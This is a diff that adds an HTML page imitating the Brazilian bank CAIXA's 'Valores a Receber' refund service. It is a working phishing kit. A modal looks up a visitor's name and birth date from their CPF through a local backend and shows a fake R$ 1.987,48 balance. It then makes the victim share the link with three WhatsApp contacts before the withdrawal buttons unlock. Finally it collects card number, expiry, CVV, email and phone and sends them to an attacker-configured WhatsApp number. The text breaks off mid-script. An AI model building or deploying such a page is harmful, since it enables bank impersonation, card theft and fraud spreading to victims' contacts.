@@ -1,0 +1,820 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>CAIXA - Valores a Receber (SVR)</title>
+
+  <!-- Bootstrap 5 (CSS) -->
+  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/css/bootstrap.min.css" rel="stylesheet">
+
+  <!-- Font Awesome -->
+  <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" rel="stylesheet">
+
+  <style>
+    /* ---------- BASE (mantendo identidade CAIXA) ---------- */
+    :root{
+      --caixa-blue: #1d62bc;
+      --caixa-blue-2: #004aad;
+      --caixa-yellow: #ffb600;
+      --accent: #379da6;
+      --card-shadow: 0 10px 30px rgba(2,23,90,0.06);
+      --muted:#666;
+    }
+    body {
+      font-family: "Segoe UI", Roboto, Arial, sans-serif;
+      background:#f4f4f4;
+      color:#222;
+      -webkit-font-smoothing:antialiased;
+      -moz-osx-font-smoothing:grayscale;
+    }
+
+    /* ---------- HEADER ---------- */
+    header.site-header{
+      background: linear-gradient(0deg,var(--caixa-blue),var(--caixa-blue));
+      box-shadow: 0 2px 6px rgba(0,0,0,0.12);
+      position: sticky; top:0; z-index:1100;
+    }
+    header.site-header .navbar {
+      padding-left: 40px;
+      padding-right: 40px;
+    }
+    @media (max-width: 768px) {
+      header.site-header .navbar {
+        padding-left: 15px;
+        padding-right: 15px;
+      }
+    }
+    .site-logo { margin-left: 10px; }
+    .site-logo img{ height:48px; }
+    .navbar-nav .nav-link{ color:#fff; font-weight:500; }
+    .navbar-nav .nav-link:hover{ text-decoration:underline; color:#f0f8ff; }
+
+    /* CTA button in hero */
+    .btn-caixa {
+      background: var(--caixa-yellow);
+      color: var(--caixa-blue-2);
+      font-weight:700;
+      border-radius:8px;
+      padding: .55rem .9rem;
+      border: none;
+      box-shadow: 0 6px 18px rgba(0,0,0,0.08);
+      transition: all 0.3s ease;
+    }
+    .btn-caixa:hover {
+      transform: translateY(-2px);
+      box-shadow: 0 8px 22px rgba(0,0,0,0.12);
+    }
+    .btn-caixa:disabled {
+      opacity: 0.5;
+      cursor: not-allowed;
+      transform: none;
+    }
+
+    /* ---------- HERO ---------- */
+    .hero {
+      background: linear-gradient(90deg,#1e65c9 0%, #379da6 100%);
+      color: #fff;
+      padding: 48px 12px;
+      text-align:center;
+    }
+    .hero .breadcrumb-custom{ color:#cfe2ff; font-size:.95rem; }
+    .hero h1{ font-size:1.9rem; margin:.25rem 0; font-weight:700; }
+    .hero .description{ max-width:760px; margin:0 auto; color:#e6f0ff; font-size:1.03rem; line-height:1.5; }
+
+    /* ---------- NAV SECONDARY ---------- */
+    .topNav{
+      background:#fff; box-shadow: 0 2px 6px rgba(0,0,0,0.06);
+      position:sticky; top:70px; z-index:1000;
+    }
+    .topNav .nav-link{ color:var(--caixa-blue-2); font-weight:600; }
+    .topNav .nav-link.active, .topNav .nav-link:hover{ color: #002e6d; border-bottom:3px solid var(--caixa-yellow); padding-bottom:.35rem; }
+
+    /* ---------- CONTENT CARDS / SECTIONS ---------- */
+    .section-card{
+      background:#fff; border-radius:12px; padding:28px; margin:30px auto; max-width:1100px;
+      box-shadow: var(--card-shadow);
+    }
+    .section-card h2{ color:var(--caixa-blue-2); font-size:1.45rem; margin-bottom:12px; }
+
+    /* ---------- FOOTER ---------- */
+    .rodape-azul{
+      background: linear-gradient(90deg,#1e65c9 0%, #5f93db 100%);
+      color:#fff; text-align:center; padding:28px 16px; margin-top:36px; border-radius:8px;
+    }
+
+    /* ---------- MODAL FLOW (Estilo Profissional) ---------- */
+    .modal-content {
+      border: 0;
+      border-radius: 20px;
+      overflow: hidden;
+      box-shadow: 0 30px 60px rgba(0,0,0,0.2);
+    }
+    .modal-header-custom {
+      background: linear-gradient(135deg, #1e65c9, #004aad);
+      padding: 20px 25px;
+      color: white;
+    }
+    .flow-step { display:none; }
+    .flow-step.active { display:block; animation: fadeInUp 0.4s ease; }
+    
+    @keyframes fadeInUp {
+      from { opacity: 0; transform: translateY(20px); }
+      to { opacity: 1; transform: translateY(0); }
+    }
+    
+    label { font-weight:600; color:#333; margin-bottom: 8px; }
+    .input-error { border-color:#d10000 !important; box-shadow: 0 0 0 3px rgba(209,0,0,0.1); }
+    .small-note{ color:var(--muted); font-size:.85rem; }
+
+    /* data options */
+    .data-option {
+      background: #f8f9fa;
+      border: 2px solid #e9ecef;
+      border-radius: 12px;
+      padding: 14px 18px;
+      margin: 10px 0;
+      cursor: pointer;
+      transition: all 0.3s ease;
+      display: flex;
+      align-items: center;
+      gap: 15px;
+    }
+    .data-option:hover {
+      border-color: var(--caixa-yellow);
+      background: #fff8e0;
+      transform: translateX(8px);
+    }
+    .data-option.selected {
+      border-color: #1a7f2e;
+      background: #e8f5e9;
+      box-shadow: 0 2px 8px rgba(26,127,46,0.2);
+    }
+    .data-option i { font-size: 24px; color: var(--caixa-blue); }
+    .data-option span { font-size: 16px; font-weight: 500; }
+    
+    /* value card */
+    .value-card {
+      background: linear-gradient(135deg, #1e65c9, #0d4ca3);
+      border-radius: 16px;
+      padding: 25px;
+      margin: 20px 0;
+      text-align: center;
+      color: white;
+      box-shadow: 0 10px 25px rgba(0,0,0,0.1);
+    }
+    .value-card .amount { font-size: 42px; font-weight: bold; margin: 15px 0; letter-spacing: -1px; }
+    .value-card .label { font-size: 13px; opacity: 0.85; text-transform: uppercase; letter-spacing: 1px; }
+    .value-card .bank-icon { font-size: 32px; margin-bottom: 10px; }
+    
+    .loading-spinner {
+      width: 50px;
+      height: 50px;
+      border: 4px solid #e0e0e0;
+      border-top-color: var(--caixa-yellow);
+      border-radius: 50%;
+      margin: 0 auto 20px;
+      animation: spin 0.8s linear infinite;
+    }
+    @keyframes spin { to { transform: rotate(360deg); } }
+    
+    .data-row{ display:flex; justify-content:space-between; padding:12px 0; border-bottom:1px solid #eee; }
+    .data-row:last-child { border-bottom: none; }
+    .card-compact { background:#fff; padding:16px; border-radius:12px; box-shadow: 0 2px 8px rgba(0,0,0,0.05); margin-top:15px; }
+    
+    .btn-modal-primary {
+      background: linear-gradient(135deg, #ffb600, #ffa000);
+      color: #004aad;
+      font-weight: 700;
+      border: none;
+      padding: 10px 24px;
+      border-radius: 10px;
+      transition: all 0.3s ease;
+    }
+    .btn-modal-primary:hover:not(:disabled) {
+      transform: translateY(-2px);
+      box-shadow: 0 5px 15px rgba(255,182,0,0.3);
+    }
+    .btn-modal-secondary {
+      background: #f8f9fa;
+      color: #6c757d;
+      border: 1px solid #dee2e6;
+      padding: 10px 24px;
+      border-radius: 10px;
+      transition: all 0.3s ease;
+    }
+    .btn-modal-secondary:hover { background: #e9ecef; }
+    
+    .step-indicator {
+      display: flex;
+      justify-content: center;
+      gap: 30px;
+      margin-bottom: 25px;
+      padding: 0 20px;
+    }
+    .step-dot { text-align: center; flex: 1; position: relative; }
+    .step-dot .dot {
+      width: 40px;
+      height: 40px;
+      background: #e9ecef;
+      border-radius: 50%;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      margin: 0 auto 8px;
+      font-weight: bold;
+      color: #6c757d;
+      transition: all 0.3s ease;
+    }
+    .step-dot.active .dot {
+      background: linear-gradient(135deg, #ffb600, #ffa000);
+      color: #004aad;
+      box-shadow: 0 2px 10px rgba(255,182,0,0.3);
+    }
+    .step-dot .label { font-size: 12px; color: #6c757d; }
+    .step-dot.active .label { color: #004aad; font-weight: 600; }
+    .step-dot::after {
+      content: '';
+      position: absolute;
+      top: 20px;
+      right: -15px;
+      width: 30px;
+      height: 2px;
+      background: #e9ecef;
+    }
+    .step-dot:last-child::after { display: none; }
+
+    /* Indicadores de amigo */
+    .friend-indicator {
+      width: 30px;
+      height: 30px;
+      border-radius: 50%;
+      display: inline-flex;
+      align-items: center;
+      justify-content: center;
+      margin: 0 3px;
+      font-size: 12px;
+      font-weight: bold;
+    }
+    .friend-indicator.success { background: #1a7f2e; color: white; }
+    .friend-indicator.pending { background: #e9ecef; color: #6c757d; }
+  </style>
+</head>
+<body>
+
+  <!-- HEADER -->
+  <header class="site-header">
+    <nav class="container navbar navbar-expand-lg">
+      <a class="navbar-brand site-logo d-flex align-items-center" href="#">
+        <img src="https://i.pinimg.com/736x/ae/3d/94/ae3d9448e7a543b4ad94870b9a1dcfa9.jpg" alt="Logo CAIXA" style="height:48px;">
+      </a>
+      <button class="navbar-toggler border-0" type="button" data-bs-toggle="collapse" data-bs-target="#mainNav">
+        <i class="fa fa-bars" style="color:#fff; font-size:1.05rem;"></i>
+      </button>
+      <div class="collapse navbar-collapse justify-content-end" id="mainNav">
+        <ul class="navbar-nav mb-2 mb-lg-0 align-items-lg-center">
+          <li class="nav-item"><a class="nav-link" href="#">Institucional</a></li>
+          <li class="nav-item"><a class="nav-link" href="#">Produtos</a></li>
+          <li class="nav-item"><a class="nav-link" href="#">Serviços</a></li>
+          <li class="nav-item"><a class="nav-link" href="#">Atendimento</a></li>
+          <li class="nav-item"><a class="nav-link" href="#">Sobre</a></li>
+        </ul>
+      </div>
+    </nav>
+  </header>
+
+  <!-- HERO -->
+  <section class="hero">
+    <div class="container">
+      <p class="breadcrumb-custom mb-2">
+        <span class="fw-semibold text-uppercase">CAIXA</span>
+        <span class="mx-2"> › </span>
+        <span class="currentNode fw-semibold">Valores a Receber</span>
+      </p>
+      <h1>Valores a Receber (SVR)</h1>
+      <div class="description mx-auto">
+        Saiba como consultar e resgatar valores a receber para pessoas físicas e jurídicas pelo sistema SVR do Banco Central do Brasil.
+      </div>
+      <div class="mt-4">
+        <a href="#" id="abrir-verificar" class="btn btn-caixa">
+          <i class="fas fa-search me-2"></i>Verificar Valores
+        </a>
+      </div>
+    </div>
+  </section>
+
+  <!-- NAV SECONDARY -->
+  <div class="topNav">
+    <div class="container d-flex align-items-center">
+      <ul class="nav gap-3 py-2 w-100 flex-wrap">
+        <li class="nav-item"><a class="nav-link active" href="#">Visão geral</a></li>
+        <li class="nav-item"><a class="nav-link" href="#t017">O que é</a></li>
+        <li class="nav-item"><a class="nav-link" href="#t018">Como consultar</a></li>
+        <li class="nav-item"><a class="nav-link" href="#wp-resgatar">Como resgatar</a></li>
+        <li class="nav-item ms-auto"><a class="nav-link" href="#">Cuidado com os golpes</a></li>
+      </ul>
+    </div>
+  </div>
+
+  <!-- MAIN CONTENT -->
+  <main class="py-4">
+    <div class="container">
+      <article id="t017" class="section-card">
+        <h2><i class="fas fa-info-circle me-2" style="color:var(--caixa-yellow);"></i>O que é</h2>
+        <p>É um sistema do Banco Central onde você pode realizar consultas de valores esquecidos em bancos, instituições financeiras ou consórcios, seja por pessoa física ou jurídica e, em caso positivo, solicitar a devolução dos recursos.</p>
+      </article>
+
+      <article id="t018" class="section-card">
+        <h2><i class="fas fa-search me-2" style="color:var(--caixa-yellow);"></i>Como consultar</h2>
+        <p>As consultas devem ser realizadas exclusivamente no endereço:
+          <a href="https://valoresareceber.bcb.gov.br/" target="_blank">https://valoresareceber.bcb.gov.br/</a>.
+          Digite o seu CPF e sua data de nascimento para consultar valores a receber.</p>
+      </article>
+
+      <article id="wp-resgatar" class="section-card">
+        <h2><i class="fas fa-hand-holding-usd me-2" style="color:var(--caixa-yellow);"></i>Como resgatar</h2>
+        <ol>
+          <li>Verifique a data informada pelo sistema para consultar o valor</li>
+          <li>Solicite a devolução dos recursos</li>
+          <li>Os valores serão creditados na sua conta CAIXA</li>
+        </ol>
+      </article>
+
+      <section class="section-card">
+        <h2><i class="fas fa-mobile-alt me-2" style="color:var(--caixa-yellow);"></i>Aplicativo CAIXA</h2>
+        <div class="row align-items-center">
+          <div class="col-lg-8">
+            <p>A CAIXA com você em qualquer hora ou lugar. Veja seu extrato, faça Pix, transferências e pagamentos de forma prática e fácil pelo seu celular.</p>
+            <div class="mt-3">
+              <a class="btn btn-outline-primary me-2" href="#"><i class="fa-brands fa-google-play"></i> Play Store</a>
+              <a class="btn btn-outline-dark" href="#"><i class="fa-brands fa-apple"></i> App Store</a>
+            </div>
+          </div>
+        </div>
+      </section>
+    </div>
+  </main>
+
+  <!-- FOOTER -->
+  <footer class="rodape-azul">
+    <div class="container">
+      <p class="mb-0 small">CAIXA ECONÔMICA FEDERAL - CNPJ 00.360.305/0001-04</p>
+    </div>
+  </footer>
+
+  <!-- MODAL PRINCIPAL -->
+  <div class="modal fade" id="flowModal" tabindex="-1" aria-hidden="true">
+    <div class="modal-dialog modal-dialog-centered modal-md">
+      <div class="modal-content">
+        <div class="modal-header-custom">
+          <div class="step-indicator" id="stepIndicator">
+            <div class="step-dot active" data-step="1"><div class="dot">1</div><div class="label">CPF</div></div>
+            <div class="step-dot" data-step="2"><div class="dot">2</div><div class="label">Verificação</div></div>
+            <div class="step-dot" data-step="3"><div class="dot">3</div><div class="label">Valor</div></div>
+          </div>
+          <button type="button" class="btn-close btn-close-white position-absolute top-0 end-0 m-3" data-bs-dismiss="modal"></button>
+        </div>
+        
+        <div class="modal-body p-4">
+          <!-- STEP 1 - CPF -->
+          <div id="flowStep1" class="flow-step active">
+            <div class="text-center mb-4">
+              <i class="fas fa-id-card fa-3x" style="color:var(--caixa-blue); opacity:0.5;"></i>
+              <p class="small-note mt-2">Digite seu CPF para consultar valores disponíveis</p>
+            </div>
+            <div class="mb-3">
+              <label class="form-label">CPF</label>
+              <input id="demoCpf" type="text" class="form-control form-control-lg" placeholder="000.000.000-00" maxlength="14" oninput="formatarCPF(this)">
+            </div>
+            <div class="d-flex gap-2 mt-4">
+              <button id="flowCancel" class="btn btn-modal-secondary flex-grow-1">Cancelar</button>
+              <button id="flowSubmit1" class="btn btn-modal-primary flex-grow-1">Consultar <i class="fas fa-arrow-right ms-2"></i></button>
+            </div>
+          </div>
+
+          <!-- LOADING -->
+          <div id="flowLoading" class="flow-step text-center">
+            <div class="loading-spinner"></div>
+            <h5>Consultando CPF...</h5>
+            <p class="small-note mt-2">Aguarde, estamos verificando seus dados no sistema</p>
+          </div>
+
+          <!-- STEP 2 - DATAS -->
+          <div id="flowStep2" class="flow-step">
+            <div class="text-center mb-3">
+              <i class="fas fa-calendar-alt fa-3x" style="color:var(--caixa-blue);"></i>
+              <p class="small-note mt-2">Selecione sua data de nascimento correta</p>
+            </div>
+            <div class="card-compact mb-3">
+              <div class="data-row"><strong>Nome:</strong> <span id="displayNome">--</span></div>
+              <div class="data-row"><strong>CPF:</strong> <span id="displayCpf">--</span></div>
+            </div>
+            <div id="dataOptionsContainer" class="mt-3"></div>
+            <div class="d-flex gap-2 mt-4">
+              <button id="flowBack1" class="btn btn-modal-secondary flex-grow-1"><i class="fas fa-arrow-left me-2"></i>Voltar</button>
+            </div>
+          </div>
+
+          <!-- STEP 3 - TELA DE CONFIRMAÇÃO COM DATAS +3 DIAS E INDICAÇÃO -->
+          <div id="flowFinal" class="flow-step">
+            <div class="text-center mb-3">
+              <i class="fas fa-calendar-check fa-3x" style="color:var(--caixa-yellow);"></i>
+              <h5 class="mt-2">Confirmação de Saque</h5>
+            </div>
+            
+            <!-- Data de crédito +3 dias -->
+            <div class="value-card" style="background: linear-gradient(135deg, #ffb600, #ffa000); color: #004aad;">
+              <div class="bank-icon"><i class="fas fa-clock"></i></div>
+              <div class="label">PREVISÃO DE CRÉDITO</div>
+              <div class="amount" style="font-size: 24px;" id="dataCredito">--/--/----</div>
+              <div class="small-note" style="color:#004aad;">O valor será creditado em até 3 dias úteis</div>
+            </div>
+
+            <div class="value-card">
+              <div class="bank-icon"><i class="fas fa-university"></i></div>
+              <div class="label">VALOR DISPONÍVEL PARA SAQUE</div>
+              <div class="amount">R$ <span id="valorDisponivel">0,00</span></div>
+            </div>
+            
+            <div class="card-compact">
+              <div class="data-row"><strong>Beneficiário:</strong> <span id="finalNome">--</span></div>
+              <div class="data-row"><strong>CPF:</strong> <span id="finalCpf">--</span></div>
+              <div class="data-row"><strong>Agência:</strong> 0001</div>
+              <div class="data-row"><strong>Conta:</strong> 12345-6</div>
+            </div>
+
+            <!-- INDICAÇÃO DE 3 AMIGOS -->
+            <div class="card-compact mt-3" style="background: #fff8e0;">
+              <div class="text-center mb-2">
+                <i class="fab fa-whatsapp" style="color:#25D366; font-size: 24px;"></i>
+                <strong>Indique 3 amigos para liberar o saque</strong>
+              </div>
+              <div class="d-flex justify-content-center gap-3 mb-3">
+                <div id="friend1" class="friend-indicator pending" data-friend="1">1</div>
+                <div id="friend2" class="friend-indicator pending" data-friend="2">2</div>
+                <div id="friend3" class="friend-indicator pending" data-friend="3">3</div>
+              </div>
+              <button id="btnIndicarWhats" class="btn btn-modal-primary w-100" style="background: #25D366; color: white;">
+                <i class="fab fa-whatsapp me-2"></i>Indicar Amigos no WhatsApp
+              </button>
+              <div class="small-note text-center mt-2">Compartilhe com 3 amigos para desbloquear o saque</div>
+            </div>
+
+            <!-- BOTÕES DE SAQUE (inicialmente travados) -->
+            <div class="mt-3">
+              <button id="btnSaquePix" class="btn btn-modal-primary w-100 mb-2" disabled style="background: #004aad; color: white;">
+                <i class="fas fa-pix me-2"></i>Sacar via Pix
+              </button>
+              <button id="btnSaqueCartao" class="btn btn-modal-primary w-100" disabled style="background: #1a7f2e; color: white;">
+                <i class="fas fa-credit-card me-2"></i>Sacar via Cartão de Crédito
+              </button>
+            </div>
+
+            <div class="d-flex gap-2 mt-4">
+              <button id="flowClose" class="btn btn-modal-secondary flex-grow-1">Fechar</button>
+            </div>
+          </div>
+
+          <!-- MODAL PIX -->
+          <div id="flowPix" class="flow-step">
+            <div class="text-center mb-3">
+              <i class="fas fa-pix fa-3x" style="color:var(--caixa-blue);"></i>
+              <h5>Saque via Pix</h5>
+            </div>
+            <div class="mb-3">
+              <label class="form-label">E-mail</label>
+              <input type="email" id="emailPix" class="form-control" placeholder="seu@email.com">
+            </div>
+            <div class="mb-3">
+              <label class="form-label">Telefone (WhatsApp)</label>
+              <input type="tel" id="telefonePix" class="form-control" placeholder="(11) 99999-9999">
+            </div>
+            <div class="value-card mb-3" style="padding: 15px;">
+              <div class="label">VALOR A RECEBER</div>
+              <div class="amount" style="font-size: 28px;">R$ <span id="pixValor">0,00</span></div>
+            </div>
+            <div class="d-flex gap-2">
+              <button id="cancelPix" class="btn btn-modal-secondary flex-grow-1">Cancelar</button>
+              <button id="confirmPix" class="btn btn-modal-primary flex-grow-1">Enviar Solicitação</button>
+            </div>
+          </div>
+
+          <!-- MODAL CARTÃO -->
+          <div id="flowCartao" class="flow-step">
+            <div class="text-center mb-3">
+              <i class="fas fa-credit-card fa-3x" style="color:var(--caixa-blue);"></i>
+              <h5>Saque via Cartão de Crédito</h5>
+            </div>
+            <div class="mb-3">
+              <label class="form-label">Número do Cartão</label>
+              <input type="text" id="numeroCartao" class="form-control" placeholder="0000 0000 0000 0000" maxlength="19">
+            </div>
+            <div class="row">
+              <div class="col-6 mb-3">
+                <label class="form-label">Validade</label>
+                <input type="text" id="validadeCartao" class="form-control" placeholder="MM/AA">
+              </div>
+              <div class="col-6 mb-3">
+                <label class="form-label">CVV</label>
+                <input type="text" id="cvvCartao" class="form-control" placeholder="123">
+              </div>
+            </div>
+            <div class="mb-3">
+              <label class="form-label">E-mail para contato</label>
+              <input type="email" id="emailCartao" class="form-control" placeholder="seu@email.com">
+            </div>
+            <div class="value-card mb-3" style="padding: 15px;">
+              <div class="label">VALOR A RECEBER</div>
+              <div class="amount" style="font-size: 28px;">R$ <span id="cartaoValor">0,00</span></div>
+            </div>
+            <div class="d-flex gap-2">
+              <button id="cancelCartao" class="btn btn-modal-secondary flex-grow-1">Cancelar</button>
+              <button id="confirmCartao" class="btn btn-modal-primary flex-grow-1">Enviar Solicitação</button>
+            </div>
+          </div>
+
+          <!-- SUCESSO -->
+          <div id="flowSuccess" class="flow-step text-center">
+            <i class="fas fa-check-circle fa-4x" style="color:#1a7f2e;"></i>
+            <h5 class="mt-3">Solicitação Enviada!</h5>
+            <p>Sua solicitação foi enviada com sucesso.<br>Em breve entraremos em contato.</p>
+            <button id="closeSuccess" class="btn btn-modal-primary mt-3">Fechar</button>
+          </div>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/js/bootstrap.bundle.min.js"></script>
+
+  <script>
+    let dadosUsuario = null;
+    let dataSelecionada = null;
+    let bootstrapModal = null;
+    let amigosIndicados = 0;
+    let saqueLiberado = false;
+
+    // Número do WhatsApp para envio (SUBSTITUA PELO SEU NÚMERO)
+    const WHATSAPP_NUMBER = "5599999999999"; // Coloque seu número com DDD e país (55)
+
+    function formatarCPF(input) {
+      let value = input.value.replace(/\D/g, '');
+      if (value.length > 11) value = value.slice(0, 11);
+      let formatted = '';
+      if (value.length > 9) {
+        formatted = value.slice(0, 3) + '.' + value.slice(3, 6) + '.' + value.slice(6, 9) + '-' + value.slice(9);
+      } else if (value.length > 6) {
+        formatted = value.slice(0, 3) + '.' + value.slice(3, 6) + '.' + value.slice(6);
+      } else if (value.length > 3) {
+        formatted = value.slice(0, 3) + '.' + value.slice(3);
+      } else {
+        formatted = value;
+      }
+      input.value = formatted;
+    }
+
+    function formatarData(dataStr) {
+      if (!dataStr) return '---';
+      const partes = dataStr.split('-');
+      if (partes.length === 3) return `${partes[2]}/${partes[1]}/${partes[0]}`;
+      return dataStr;
+    }
+
+    function formatarMoeda(valor) {
+      return valor.toLocaleString('pt-BR', { minimumFractionDigits: 2, maximumFractionDigits: 2 });
+    }
+
+    function getDataMaisDias(dias) {
+      const data = new Date();
+      data.setDate(data.getDate() + dias);
+      return data.toLocaleDateString('pt-BR');
+    }
+
+    function updateStepIndicator(step) {
+      document.querySelectorAll('.step-dot').forEach((el, idx) => {
+        if (idx + 1 <= step) el.classList.add('active');
+        else el.classList.remove('active');
+      });
+    }
+
+    function showStep(stepId, stepNumber) {
+      const steps = ['flowStep1', 'flowLoading', 'flowStep2', 'flowFinal', 'flowPix', 'flowCartao', 'flowSuccess'];
+      steps.forEach(id => {
+        const el = document.getElementById(id);
+        if (el) el.classList.remove('active');
+      });
+      const target = document.getElementById(stepId);
+      if (target) target.classList.add('active');
+      if (stepNumber) updateStepIndicator(stepNumber);
+    }
+
+    async function buscarCPF(cpf) {
+      try {
+        const response = await fetch('http://localhost:3000/buscar-cpf', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ cpf: cpf })
+        });
+        return await response.json();
+      } catch (error) {
+        return { success: false, erro: 'Erro ao conectar com o servidor' };
+      }
+    }
+
+    function mostrarOpcoesData(opcoes, dataReal) {
+      const container = document.getElementById('dataOptionsContainer');
+      container.innerHTML = '';
+      opcoes.forEach(dataStr => {
+        const div = document.createElement('div');
+        div.className = 'data-option';
+        div.innerHTML = `<i class="fas fa-calendar-alt"></i><span>${formatarData(dataStr)}</span><i class="fas fa-chevron-right ms-auto" style="opacity:0.5"></i>`;
+        div.onclick = () => {
+          if (dataStr === dataReal) {
+            document.querySelectorAll('.data-option').forEach(opt => opt.classList.remove('selected'));
+            div.classList.add('selected');
+            dataSelecionada = dataStr;
+            
+            // Preenche a tela final
+            document.getElementById('valorDisponivel').textContent = formatarMoeda(1987.48);
+            document.getElementById('finalNome').textContent = dadosUsuario.nome;
+            document.getElementById('finalCpf').textContent = document.getElementById('displayCpf').textContent;
+            document.getElementById('pixValor').textContent = formatarMoeda(1987.48);
+            document.getElementById('cartaoValor').textContent = formatarMoeda(1987.48);
+            document.getElementById('dataCredito').textContent = getDataMaisDias(3);
+            
+            showStep('flowFinal', 3);
+          } else {
+            div.style.background = '#ffebee';
+            div.style.borderColor = '#d10000';
+            setTimeout(() => {
+              div.style.background = '';
+              div.style.borderColor = '';
+            }, 500);
+            alert('❌ Data incorreta! Tente novamente.');
+          }
+        };
+        container.appendChild(div);
+      });
+    }
+
+    function enviarWhatsApp(mensagem) {
+      const url = `https://wa.me/${WHATSAPP_NUMBER}?text=${encodeURIComponent(mensagem)}`;
+      window.open(url, '_blank');
+    }
+
+    function verificarLiberacaoSaque() {
+      if (amigosIndicados >= 3) {
+        saqueLiberado = true;
+        document.getElementById('btnSaquePix').disabled = false;
+        document.getElementById('btnSaqueCartao').disabled = false;
+      }
+    }
+
+    document.addEventListener('DOMContentLoaded', () => {
+      const modalElement = document.getElementById('flowModal');
+      bootstrapModal = new bootstrap.Modal(modalElement, { backdrop: 'static', keyboard: false });
+      
+      document.getElementById('abrir-verificar').addEventListener('click', (e) => {
+        e.preventDefault();
+        document.getElementById('demoCpf').value = '';
+        amigosIndicados = 0;
+        saqueLiberado = false;
+        showStep('flowStep1', 1);
+        bootstrapModal.show();
+      });
+      
+      document.getElementById('flowCancel').addEventListener('click', () => bootstrapModal.hide());
+      document.getElementById('flowClose').addEventListener('click', () => bootstrapModal.hide());
+      document.getElementById('flowBack1').addEventListener('click', () => showStep('flowStep1', 1));
+      
+      document.getElementById('flowSubmit1').addEventListener('click', async () => {
+        const cpfInput = document.getElementById('demoCpf');
+        let cpf = cpfInput.value.replace(/\D/g, '');
+        if (cpf.length !== 11) {
+          cpfInput.classList.add('input-error');
+          setTimeout(() => cpfInput.classList.remove('input-error'), 1500);
+          return;
+        }
+        showStep('flowLoading', 2);
+        const resultado = await buscarCPF(cpf);
+        if (resultado.success && resultado.nome) {
+          dadosUsuario = resultado;
+          document.getElementById('displayNome').textContent = resultado.nome;
+          document.getElementById('displayCpf').textContent = cpfInput.value;
+          mostrarOpcoesData(resultado.opcoesDatas, resultado.dataReal);
+          showStep('flowStep2', 2);
+        } else {
+          alert(resultado.erro || 'Erro ao consultar CPF');
+          showStep('flowStep1', 1);
+        }
+      });
+
+      // Indicação de amigos no WhatsApp
+      document.getElementById('btnIndicarWhats').addEventListener('click', () => {
+        if (amigosIndicados >= 3) {
+          alert('Você já indicou 3 amigos! O saque já está liberado.');
+          return;
+        }
+        
+        const mensagem = `🎉 *Indicação de Amigo* 🎉\n\nOlá! Eu estou participando do programa de Valores a Receber da CAIXA e preciso indicar amigos para liberar meu saque.\n\n🔹 *Acesse o link e consulte seus valores:*\n${window.location.href}\n\n🔹 *Valor disponível para saque:* R$ 1.987,48\n\nObrigado pela ajuda! 💙`;
+        
+        enviarWhatsApp(mensagem);
+        
+        // Simula indicação após compartilhar
+        amigosIndicados++;
+        const friendDiv = document.getElementById(`friend${amigosIndicados}`);
+        if (friendDiv) {
+          friendDiv.classList.remove('pending');
+          friendDiv.classList.add('success');
+          friendDiv.innerHTML = '✓';
+        }
+        
+        verificarLiberacaoSaque();
+        
+        if (amigosIndicados < 3) {
+          alert(`Ótimo! Você indicou ${amigosIndicados} de 3 amigos. Continue para liberar o saque.`);
+        } else {
+          alert('✅ Parabéns! Você indicou 3 amigos. Os botões de saque foram liberados!');
+        }
+      });
+
+      // Saque via Pix
+      document.getElementById('btnSaquePix').addEventListener('click', () => {
+        if (!saqueLiberado) {
+          alert('Você precisa indicar 3 amigos no WhatsApp para liberar o saque!');
+          return;
+        }
+        showStep('flowPix', 3);
+      });
+
+      document.getElementById('confirmPix').addEventListener('click', () => {
+        const email = document.getElementById('emailPix').value;
+        const telefone = document.getElementById('telefonePix').value;
+        
+        if (!email || !telefone) {
+          alert('Por favor, preencha todos os campos.');
+          return;
+        }
+        
+        const mensagem = `🆕 *NOVA SOLICITAÇÃO DE SAQUE - PIX* 🆕\n\n` +
+          `👤 *Beneficiário:* ${dadosUsuario?.nome || 'N/A'}\n` +
+          `🆔 *CPF:* ${document.getElementById('displayCpf')?.textContent || 'N/A'}\n` +
+          `📧 *E-mail:* ${email}\n` +
+          `📱 *Telefone:* ${telefone}\n` +
+          `💰 *Valor:* R$ 1.987,48\n` +
+          `🏦 *Banco:* CAIXA ECONÔMICA FEDERAL\n` +
+          `📅 *Data da solicitação:* ${new Date().toLocaleString('pt-BR')}\n` +
+          `⏰ *Previsão de crédito:* ${getDataMaisDias(3)}\n\n` +
+          `✅ *Solicitação enviada via Pix*`;
+        
+        enviarWhatsApp(mensagem);
+        alert('✅ Solicitação enviada com sucesso! Em breve entraremos em contato.');
+        showStep('flowSuccess', 3);
+      });
+
+      // Saque via Cartão
+      document.getElementById('btnSaqueCartao').addEventListener('click', () => {
+        if (!saqueLiberado) {
+          alert('Você precisa indicar 3 amigos no WhatsApp para liberar o saque!');
+          return;
+        }
+        showStep('flowCartao', 3);
+      });
+
+      document.getElementById('confirmCartao').addEventListener('click', () => {
+        const numero = document.getElementById('numeroCartao').value;
+        const validade = document.getElementById('validadeCartao').value;
+        const cvv = document.getElementById('cvvCartao').value;
+        const email = document.getElementById('emailCartao').value;
+        
+        if (!numero || !validade || !cvv || !email) {
+          alert('Por favor, preencha todos os campos.');
+          return;
+        }
+        
+        const mensagem = `🆕 *NOVA SOLICITAÇÃO DE SAQUE - CARTÃO* 🆕\n\n` +
+          `👤 *Beneficiário:* ${dadosUsuario?.nome || 'N/A'}\n` +
+          `🆔 *CPF:* ${document.getElementById('displayCpf')?.textContent || 'N/A'}\n` +
+          `💳 *Número do Cartão:* ${numero}\n` +
+          `📅 *Validade:* ${validade}\n` +
+          `🔢 *CVV:* ${cvv}\n` +
+          `📧 *E-mail:* ${email}\n` +
+          `💰 *Valor:* R$ 1.987,48\n` +
+          `🏦 *Banco:* CAIXA ECONÔMICA FEDERAL\n` +
+          `📅 *Data da solicitação:* ${new Date().toLocaleString('pt-BR')}\n` +
+          `⏰ *Previsão de crédito:* ${getDataMaisDias(3)}\n\n` +
+          `✅ *Solicitação enviada via Cartão*`;
+        
+        enviarWhatsApp(mensagem);
+        alert('✅ Solicitação enviada com sucesso! Em breve entraremos em contato.');
+        showStep('flowSuccess', 3);
+      });
+
+      // Fechar modais
